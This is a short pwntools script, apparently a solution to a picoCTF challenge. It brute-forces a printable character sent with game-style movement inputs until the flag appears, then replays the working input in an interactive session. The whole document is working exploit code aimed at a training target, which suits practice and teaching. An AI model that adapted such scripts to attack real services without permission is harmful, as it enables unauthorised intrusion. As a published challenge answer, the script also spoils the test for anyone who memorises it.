#!/usr/bin/python3
#Author: Hack.You

from pwn import *
import sys
import string
import warnings

warnings.filterwarnings('ignore')
context.log_level = 'warning'

hostname = sys.argv[1]
port = sys.argv[2]


for i in string.printable:
    io = remote(f'{hostname}', f'{port}')
    io.sendline('l'+i)
    io.sendline(b'w'*4)
    io.sendline(b'd'*47)
    io.sendline(b'wp')
    recv = io.recvall()
    if b'picoCTF' in recv:
        print(f'Remote offset found as {i}')
        offset = i 
        break

print(offset)
io = remote(f'{hostname}', f'{port}')
io.sendline('l'+offset)
io.sendline(b'w'*4)
io.sendline(b'd'*47)
io.sendline(b'wp')
io.interactive()
